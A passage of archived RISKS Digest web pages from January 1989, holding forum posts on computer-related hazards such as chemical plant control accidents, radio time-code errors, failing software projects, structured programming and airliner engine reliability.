&lt;<A HREF="mailto:mvp@v7fs1.UUCP">
mvp@v7fs1.UUCP
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 14:30:37 PST
</i><PRE>

I read the excerpt from the 1/17/89 "The Australian" with extreme aggravation.
Where do these idiot reporters get the idea that garden-variety credit card
fraud has anything to do with computer "hacking" by any definition of "hacking"?
The only place where computers even came into the story was that the criminals
were using bulletin boards to distribute the stolen credit card numbers.

With the exception of the first paragraph of the story, of course.  The
paragraph which had all the obligatory vague references to "defence and banking
networks".  This paragraph, which speaks of the alleged "hackers" breaking into
alleged dial-up numbers to alleged "anti-ballistic missile launch silos" is
obviously bogus.  The only country on this planet that has any anti-ballistic
missiles is the Soviet Union.

Mike Van Pelt  Video 7

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
Counting engines
</A>
</H3>
<address>
Don Alvarez 
&lt;<A HREF="mailto:boomer@space.mit.edu">
boomer@space.mit.edu
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 15:20:50 EST
</i><PRE>

Various contributors have discussed the relative merits of two or three engine
planes.  Anybody who thinks they can rate the reliability of a commercial jet
simply by counting the numbers of engines is certainly ignoring something.
Engineering is tradeoffs.  I challenge anyone to present a pair of airplanes
whose relative reliabilty can be determined simply by counting the number of
engines.

Imagine two planes which are identical except that one plane has 2
Bratt&amp;Zittley Foobar-900 engines, and the other has 3 B&amp;Z F-900 engines.  Well,
clearly the second will fly better on n-1 engines, but it takes in the same
number of $ in revenue for each flight, and costs 50% more to maintain than the
2 engine plane.  Economics tells you that the $ have to be made up somewhere.
Chances are you will do a risk/benefit analysis and drop the maintenance
schedule on the second until its reliability drops to the level of the cheaper
plane.  Otherwise you go broke.  If you say the second plane brings in more
revenues because it holds more seats, then either you are overloading the
airframe of the second plane or else it is bigger than the two engine plane.
If you overload the airframe, that clearly affects safety.  If its a bigger
plane, then its a different plane, and you can't compare apples and oranges.
Ditto for putting smaller engines in the three engine plane.

Second guessing the tradeoffs made in designing a system as complicated as a
commercial airliner is more than a simple exercise in counting.
                                     				- Don Alvarez

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.10.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.12.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-62</DOCNO>
<DOCOLDNO>IA012-000131-B037-196</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.12.html 128.240.150.127 19970217025124 text/html 26600
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:49:49 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 12</TITLE>
<LINK REL="Prev" HREF="/Risks/8.11.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.13.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.11.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.13.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 12</H1>
<H2> Friday 20 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Risk of using your own name 
</A>
<DD>
<A HREF="#subj1.1">
Gary T
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Risks in NBS time by radio (computer malfunction downs lights) 
</A>
<DD>
<A HREF="#subj2.1">
Clements
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computer-related accidents in British chemical industry 
</A>
<DD>
<A HREF="#subj3.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Losing Systems 
</A>
<DD>
<A HREF="#subj4.1">
Henry Spencer
</A><br>
<A HREF="#subj4.2">
 Donald Lindsay
</A><br>
<A HREF="#subj4.3">
 Keane Arase
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Failure of Software Projects 
</A>
<DD>
<A HREF="#subj5.1">
WHMurray
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Structured Programming 
</A>
<DD>
<A HREF="#subj6.1">
David Collier-Brown
</A><br>
<A HREF="#subj6.2">
 Jerry Schwarz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Discrete probability and airplanes 
</A>
<DD>
<A HREF="#subj7.1">
Mike Olson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Chaos theory 
</A>
<DD>
<A HREF="#subj8.1">
Phil Goetz
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risk of using your own name
</A>
</H3>
<address>
&lt;<A HREF="mailto:garyt@cup.portal.com">
garyt@cup.portal.com
</A>&gt;
</address>
<i>
Fri, 20-Jan-89 09:37:56 PST
</i><PRE>

Computergram Number 1098 (published by Apt Data Services in London) featured a
story from Newsbytes that illustrates the risk of using your own name to test a
computer program.  Michelle Gordon, training as a police dispatcher in
Bloomfield, Connecticut, was told by her instructor to use her own name as a
test case to see how the computer reports outstanding "wants and warrants"
against an individual.  Michelle did so -- and was shocked to find out that she
was wanted for passing a bad check! Back in July, she had written a $90.97
check to a clothing store, and the check had bounced.  After turning herself
in, she was relieved of duty -- but the police say that she should get her job
back once the bill has been paid.
                                     [I notice Gary did not use HIS name.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Risks in NBS time by radio: Computer malfunction downs traffic lights.
</A>
</H3>
<address>
&lt;<A HREF="mailto:clements@DIP.BBN.COM">
clements@DIP.BBN.COM
</A>&gt;
</address>
<i>
Fri, 20 Jan 89 13:11:09 -0500
</i><PRE>

&gt; ... The cause reportedly may have been a breakdown in the radio 
&gt; communications between a computer in Colorado Springs and an atomic
&gt; clock in Boulder.  ...  (Re: <A HREF="/Risks/8.11.html">RISKS-8.11</A>) 

I'll guess that this radio communications system is the NBS transmissions from
WWV in Fort Collins (which is synchronized to Boulder).

Aside from the obvious risks in designing a system the way this one (the
traffic signals) was apparently done, the transmission code used by WWV is
inherently risky.  There is no parity check on the data in the code. (And only
day of year, not year, which is another story with its own risks.)

Receiving clocks must compare successive samples of the code, which is BCD-ish
and has a one minute cycle, and see whether the samples are in the correct
sequence.  Eventually the clock decides it has correctly read the code.  But if
a static burst or radio fade garbles the same bit in the code for a few minutes
the clock will set to the wrong time.  The Heath "Most Accurate Clock" reads
these transmissions and fails in this way.  A couple of times a year I will see
my clock confidently displaying a time which is EXACTLY 4 hours wrong or
EXACTLY 20 minutes wrong.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computer-related accidents in British chemical industry
</A>
</H3>
<address>
&lt;<A HREF="mailto:JON.JACKY@GAFFER.RAD.WASHINGTON.EDU">
JON.JACKY@GAFFER.RAD.WASHINGTON.EDU
</A>&gt;
</address>
<i>
20 Jan 1989 11:27:53 EST
</i><PRE>

Here are some interesting examples of hardware-software-user interaction from
the British trade magazine, CONTROL AND INSTRUMENTATION, Vol 20 No 10, October
1988, pps. 57, 59: 

Wise After the Event by Trevor Kletz

... Computer hardware faults do occur. ... Their effects can be reduced
by installing `watch-dogs.' However, an error in a watch-dog card actually
caused one accident --- valves were opened at the wrong time and several
tons of hot liquid were spilt [ref 1].

...In one plant, a pump and various pipelines were used for several different
duties -- for transferring methanol from a road tanker to storage, for charging
it to the plant and for moving recovered methanol back from the plant. 
A computer set the various valves, monitored their positions and switched
the transfer pump on and off.   On the occasion in question, a road tanker
was emptied.  The pump had been started from the panel, but had been stopped
by means of a local button.  The next job was to transfer some methanol
from storage to the plant.  The computer set the valves, but as the pump
had been stopped manually it had to be started manually.  When the transfer
was complete the PES [Programmable Electronic System --- British for computer
control system - JJ]  told the pump to stop, but as it had been started
manually it did not stop and a spillage occured [ref 5].

... Another incident occured on a pressure filter which was controlled by
a PES.  It circulated a liquor through a filter ... As more solid was deposited
on the filter the pressure drop increased.  To measure the pressure drop,
the computer counted up the number of times that tyhe pressure of the air
in the filter needed to be topped up in 15 minutes.  It had been told that
if less than five top-ups were needed, filtration was complete ... If more
than five top-ups were needed, the liquor was circulated for a further two
hours.  Unfortunately a leak of compressed air into the filter occured which
misled the computer into thinking that the filtration was complete.  It
signalled this fiction to the operator who opened the filter door --- and
the entire batch, liquid and solid, was spilt. ... The system had detected
that something was wrong, but the operator either ignored this warning sign
or did not appreciate its significance [ref 2].

... (In one incident) when a power failure occured on one site the computer
printed a long list of alarms.  The operator did not know what had caused
the upset and did nothing.  After a few minutes an explosion occured.
Afterwards the designer admitted that he had overloaded the operator with
too much information, but he asked why the individual had not assumed the
worst and tripped the plant?

... (In another incident) a computer was taken off-line so that the program
could be changed.  At the time it was counting the revolutions on a metering
pump which was feeding a batch reactor.  When the computer was put back
on line it continued counting where it had left off --- with the result
that the reactor was overcharged.

References (included in the article)

1. I Nimmo, SR Nunns, and BW Eddershaw, Lessons learned from the failure
of a computer system controlling a nylon polymer plant.  Safety and Reliability
Society Symposium, Altrincham, UK, Nov 1987.

2. Chemical Safety Summary, Vol 56, No 221, 1985, p. 6, (Published by Chemical
Industries Association, London).

- Jonathan Jacky, University of Washington

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Losing Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Fri, 20 Jan 89 00:21:32 EST
</i><PRE>

&gt;Managers see knowledge about computing only useful to engineers and 
&gt;programmers. Business schools for the most part do not teach computer 
&gt;literacy, nor how a non-technical manager should deal with a large software 
&gt;system in his company...

This is actually part of a larger problem.  I recall reading an interview
with a Japanese business-methods type lecturing in the US.  One of the
first things he asks his students to do is solve a simple quadratic equation.
Many of them are baffled; most are offended.  He then explains to them, as
gently as possible, that one cannot do any form of optimization (of costs,
production rate, whatever) without solving quadratics (at least).  North
American business schools, by and large, have the same preoccupations as
North American businesses:  mergers, acquisitions, advertising, and legal
maneuvering, as opposed to making better products at lower cost.  The
problem, increasingly, is not that managers are ignorant of technical
issues, but that they consider them unimportant.  The ignorance is an
effect, not a cause.
                                     Henry Spencer at U of Toronto Zoology

</PRE>
<HR><H3><A NAME="subj4.2">
Re: Losing Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:Donald.Lindsay@K.GP.CS.CMU.EDU">
Donald.Lindsay@K.GP.CS.CMU.EDU
</A>&gt;
</address>
<i>
Fri, 20 Jan 1989 13:21-EDT
</i><PRE>

&gt;From:  Jerome H. Saltzer &lt;Saltzer@LCS.MIT.Edu&gt;
&gt;I believe that the more fundamental answer is that the pace of
&gt;improvement of hardware technology in the computer business has, for 35
&gt;years now, simply been running faster than our ability to develop the
&gt;necessary experience to use it effectively, safely, and without big
&gt;mistakes.

I don't think it's "developing" experience: it's spreading experience.
The technology has given us:
 1. online systems (terminals), which led to:
	 - distributed systems
	 - interactive human interfaces
 2. speed, price, reliability, and all that.

I don't think that the failures stem from our progress on Point 1.  We
had online systems in the 1960's.  Those development projects were seen
as big, expensive, hairy projects that entailed risk.  Now that similar
projects are cheap, the difficulty is somehow overlooked. Take, for
example, the municipal system that started this debate. It was unusable
because it did not integrate well into the complex environment that the
projected users were already coping with. We had failures like that in
the 1960's. I would blame our advanced technology, not for raising deep
issues, but for putting big problems into a multitude of small hands.

Don		lindsay@k.gp.cs.cmu.edu    CMU Computer Science

</PRE>
<HR><H3><A NAME="subj4.3">
Re: Losing Systems
</A>
</H3>
<address>
"Keane Arase" 
&lt;<A HREF="mailto:kean%tank@oddjob.uchicago.edu">
kean%tank@oddjob.uchicago.edu
</A>&gt;
</address>
<i>
Fri, 20 Jan 89 09:09:07 CST
</i><PRE>

I can add some first hand information about losing systems.  Let me tell
you a story about a data collection manufacturing pacakge I stayed as far
away as possible from.

Background:  This was a marketing intensive company.  This company considers
technical support people expendable.  They would rather lose their experienced
people because programmers/analysts coming out of school are cheaper.  BTW,
they hired on grade point average only.  Not what you know, but what you did in
school.  In my experience, the two are *not* the same.

It was decided we were to develop an off-the-shelf/base package which could be
custom modifiable for data collection/time and attendance functions for the
manufacturing environment.  Because of a recent reorganization, all of the
experienced project leaders and programmers *fled* the company.

Our most experienced project leader (hat was left) had stated he was leaving in
6 weeks because of personal reasons.  Yet the project planning and design was
given to him to do.  Six weeks later, he left, the project design about 30%
completed.  Another person (from another area in the country) was brought in to
complete the design.  Soon after the design was completed, *he* left the
company because of a better offer elsewhere.  Thus, we had no one who
completely knew the entire system design.  Worse, none of the programmers knew
the manufacturing environment, so they couldn't spot any design errors, even if
they stared them in the face.

Since the reorganization made us a profit center, we now *had* to make money.
This, of course, while 90% of our efforts went toward development of a product
which was projected to make money in *two* years.  Because we were in the red,
raises were denied to certain programmers (through no fault of their own), who
in turn did extremely shoddy work in the programs they put together.  (And of
course, left at first opportunity.)  Our regional manager also declared that we
would receive no new hardware, since we couldn't justify the cost because we
were losing money.  Thus, we didn't have the necessary hardware that this
package was supposed to be running on.  (Only later did marketing force our
regional manager to get the equipment.  Much of the equipment belonged to our
certification, verification and testing site.)

Because the project was losing money and behind schedule, programmers were
*required* to work 45 hours per week.  No compensation, no exception.  Several
more programmers *fled* the company.  They hired part time people to fill in
the losses.  (Sorry, can't hire more people.  Can't justify the cost!)

In the scheduling, there was no provision for extensive system testing, or for
the development of test scripts.  More delays, more time and money lost.

Because we were losing money, the company decided our district was expendable
and desolved our group.  We were given the option to move to a medium sized
city in Southern Ohio, where their home headquarters is.  *No one went*.  Thus,
this company had a $300K+ package, somewhat complete (about 250K to 350K
lines), but far from working correctly, with NO ONE ON THE ORGINAL OR
SUBSEQUENT PROJECT TEAMS LEFT IN THE COMPANY! (From the spies I have in the
company, they hired a bunch of college kids straight out of school to complete
the work under 2 experienced project leaders.)

This post details about 40% of the problems encountered during the development.
It doesn't include poor hardware design, or the fact this package is really to
extensive to run on the recommended hardware.  Even with all that went wrong,
this company is still marketing this package today, training people how to sell
it and install it.  (The base package is more or less useless without
modification.)  I'll bet it still doesn't work today.

I think I can summarized why projects fail by the following:

Poor planning and quality control.  By far the worst offender.  How can you
keep within budget and time frame if certain critical events are left out of
the schedule?

Poor management and company policy.  This is probably the second worst
offender, although I'd probably tie it for number one.  Management is only
interested in one thing.  The bottom line.  Does it make money NOW?  (Apologies
to those managers who aren't this way.  But I'll bet if you work for a large
computer corporation, and your year end bonus depends on how much your site
makes, you *are* one of these.)  They must also provide the necessary resources
to get the project done.  This includes keeping your people and treating them
right.  (At least until everything works! :-) Also, managers who know nothing
about the computer biz or the programming environment, should be managing the
sanitation engineers or the cafeteria staff.  They have no business managing
things they know nothing about.

Poor expertise by programmers.  This is not necessarily the programmers fault,
but the companies fault for not providing the education.  (Please note this
assumes competent people! If the human resources department does their work
properly, getting competent people shouldn't be a *big* problem.)  Programmers
should know what they're programming *for* as well as what the programs should
do.  Programmers should also know the project.  I had enough pull and technical
expertise to be involved in *other* failing projects.  (Want to hear others?
E-mail me, and if I have the time I'll detail others.)
                                                                               
Keane Arase, Systems Programmer, University of Chicago                  
Disclaimer:  This company was *not* the University of Chicago!              

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 Failure of Software Projects
</A>
</H3>
<address>
&lt;<A HREF="mailto:WHMurray@DOCKMASTER.ARPA">
WHMurray@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Fri, 20 Jan 89 12:43 EST
</i><PRE>

Jerry Saltzer suggests that the trouble with software is the speed of advance
in hardware; that the software developer is overwhelmed by the new function and
opportunity.  Else, he suggests, normal engineering discipline would suffice.

I would like to suggest that it would suffice anyway if it were applied.  The
difficulty is that software is managed by programmers, not engineers.
Programmers have no tradition of quality of their own and insist that their
activity is so different from what engineers do, that engineers have nothing to
teach them.

Suppose that you had been an electronics engineer in 1960 but had been out of
the field since.  Don't you think that you would see more product complexity
and risk if you re-entered today?  Engineering discipline has been adequate to
cope there.  It would be able to cope in software too, if only it were
regularly applied.

I am hopeful that the use of the term "case" presages the application of more
discipline in programming.

I also draw hope from the entreprenurial development of software for the
market, as opposed to works built for hire for a single organization.  I saw a
great deal of quality software at Egghead on Saturday.

William Hugh Murray, Fellow, Information System Security, Ernst &amp; Whinney
2000 National City Center Cleveland, Ohio 44114                          
21 Locust Avenue, Suite 2D, New Canaan, Connecticut 06840                

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Structured Programming
</A>
</H3>
<address>
David Collier-Brown
&lt;<A HREF="mailto:dave@lethe.UUCP ">
dave@lethe.UUCP 
</A>&gt;
</address>
<i>
20 Jan 89 02:21:37 GMT
</i><PRE>

horning@src.dec.com (Jim Horning) comments:
&gt; I read Bruce Karsh's diatribe with incredulity.  He conjures up from thin
&gt; air a straw man to denounce.  I simply cannot find any contact between the
&gt; "structured programming" that he talks about and structured programming as
&gt; it is understood in the computer science and software engineering communities.

    Fair enough, but he is describing an understanding which is very prevalent
in the industry... Many managers from the pre-structured era understand
structured programming to be just what was described:  a supposed panacea.

    The academic community does not even know the difference. In faculty "A" of
our major local university, it is understood as a suite of
complexity-management tools, mostly the "mental tool" sort.  In faculty "B" it
is understood, if at all, as a rule-set which is supposed to produce correct
programs.

   Any of my last three major employers contained people who took opposing
views on the meaning of structured programming. What I found significant was
that the people who regarded it as a tool also knew its weaknesses and knew
other tools and techniques.. The people who claimed it was a panacea invariably
knew no other technique for improving program quality.

  It sounds like Bruce worked for one of the snake-oil salesmen and did not
have the opportunity to see it used by a professional or academic software
engineer.  And yes, I agree with him that using it as snake oil has placed us
at risk.

--dave (when faced with strawman, pull stuffing out) c-b

</PRE>
<HR><H3><A NAME="subj6.2">
Structured Programming
</A>
</H3>
<address>
Jerry Schwarz
&lt;<A HREF="mailto:jss@ulysses.att.com   <hector!jss>   ">
jss@ulysses.att.com   &lt;hector!jss&gt;   
</A>&gt;
</address>
<i>
Wed, 18 Jan 89 20:25:34 EST
</i><PRE>

Arguments about the influence of structured programming seem slightly old
fashioned to me.  In the circles I travel in "object oriented" is the hot new
buzzword.
                                        Jerry Schwarz

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Discrete probability and airplanes
</A>
</H3>
<address>
Mike Olson
&lt;<A HREF="mailto:mao@blia.UUCP ">
mao@blia.UUCP 
</A>&gt;
</address>
<i>
19 Jan 89 12:34:40 PST (Thu)
</i><PRE>

In RISKS 8.10, steve jay (shj@ultra.com) comments

&gt; Even assuming that a 3 engined plane needs two engines to fly,
&gt; the odds of 2 engines failing on a 3 engined plane are much, much,
&gt; smaller than the odds of 1 engine failing on a 2 engined plane.

this is essentially true, with the ordinary mind-bending caveats that
probability theory imposes.  if the probability of a single engine failing
is p, then the probability of one of three engines failing is 3p (this is
actually the expected value of the random variable that maps failure to
one, and non-failure to zero, but it'll serve).  p is a real number between
zero and one, by the way.  in this case, we can assume that it's closer
to zero than to one.

the probability of two of three engines failing is 6(p**2), since the
probability of one engine failing is 3p, and the probability of one of the
remaining two failing is 2p, and we multiply (since they're independent
events -- the proof is sort of hairy for our purposes).

all this is true, of course, as long as all the engines are working.  as
soon as one fails, the overall probability of failure changes.  for example,
the probability of two of three engines failing is 6(p**2), as above.  as
we're flying along, one engine fails.  oops.  the probability that another
engine will fail is 2p, and not the 6(p**2) that seems intuitively correct.
airplane engines, like coins, have no memory -- or if they do, it's the
wrong kind.

the risks?  statements like "the odds of ... [failure] ... are much, much
smaller" can be misleading.  the debate here over the likelihood of failure
is evidence of that -- a group of intelligent, educated people can't agree
on the odds.  numbers are tricky in this field, and don't always behave
the way you'd expect them to.

when i was studying this stuff, a friend said to me, "the first thing to do
when a probability theorist asks you a question is to grab him by the throat,
slam him up against the wall, and ask him, 'what do you MEAN?!?'"  this is
good advice.  it's also a good idea to quantify things explicitly -- how
*much* less likely is failure, when you add another engine? -- rather than
to offer imprecise reassurance.
    				         mike olson, britton lee, inc.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Re: Chaos theory
</A>
</H3>
<address>
&lt;<A HREF="mailto:PGOETZ@LOYVAX.BITNET">
PGOETZ@LOYVAX.BITNET
</A>&gt;
</address>
<i>
Fri, 20 Jan 89 11:12 EST
</i><PRE>

     I'd like to know just how applying chaos theory to a defense system shows
ANY results at all about the stability of the political systems related to that
system.  The idea that you can mathematically prove the effects of one isolated
system on the relations between two nations is absurd.  The current thawing
between the US and the USSR depends largely on the fact that Reagan and
Gorbachev like each other.  Could anybody have proved that 8 years ago?  No.

Phil Goetz

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.11.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.13.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-63</DOCNO>
<DOCOLDNO>IA012-000131-B037-218</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.13.html 128.240.150.127 19970217025137 text/html 25029
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:50:06 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 13</TITLE>
<LINK REL="Prev" HREF="/Risks/8.12.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.14.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.12.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.14.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 13</H1>
<H2> Sunday 22 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Gigabit superhighway/worms 
</A>
<DD>
<A HREF="#subj1.1">
Vint Cerf
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  IAB Ethics DRAFT 
</A>
<DD>
<A HREF="#subj2.1">
Vint Cerf
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Space shuttle computer problems, 1981--1985 
</A>
<DD>
<A HREF="#subj3.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  F-16 that can't stall falls from sky 
</A>
<DD>
<A HREF="#subj4.1">
Scot E Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: China accused of software piracy 
</A>
<DD>
<A HREF="#subj5.1">
Jim Olsen
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Losing systems 
</A>
<DD>
<A HREF="#subj6.1">
Dale Worley
</A><br>
<A HREF="#subj6.2">
 Chris Lewis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Structured Programming 
</A>
<DD>
<A HREF="#subj7.1">
John Mainwaring
</A><br>
<A HREF="#subj7.2">
 Mark Rosenstein
</A><br>
<A HREF="#subj7.3">
 Steve Pozgaj
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Gigabit superhighway/worms (RISKS-8.9)
</A>
</H3>
<address>
&lt;<A HREF="mailto:CERF@A.ISI.EDU">
CERF@A.ISI.EDU
</A>&gt;
</address>
<i>
23 Jan 1989 00:09-EST
</i><PRE>

In RISKS-8.9, Brad Blumenthal asks whether our legislators and their staff are
aware of the similarity between the internet and the proposed multi-gigabit
superhighway. I can assure Mr. Blumenthal that the question has arisen and has
been posed to several members of the research community by members of the
Congress responsible for scientific and technical matters.  The worm affair
made a strong impact on policy makers.
                                                  Vint Cerf

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
IAB Ethics DRAFT (RISKS-8.8)
</A>
</H3>
<address>
&lt;<A HREF="mailto:CERF@A.ISI.EDU">
CERF@A.ISI.EDU
</A>&gt;
</address>
<i>
23 Jan 1989 00:09-EST
</i><PRE>

The copy of the IAB statement on ETHICS was a DRAFT copy circulated for
internal comment by the IAB before final editing and release.  I would be
very interested to know how a copy happened to fall into Mr. Stoll's hands.
Readers should be advised that the copy they saw is still subject to change
until ratified by the IAB.
                                           Vint Cerf

  [By the way, subsequent to the appearance of RISKS-8.8, Cliff noted to me
  that he had accidentally omitted the author's name from the DRAFT.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Space shuttle computer problems, 1981--1985
</A>
</H3>
<address>
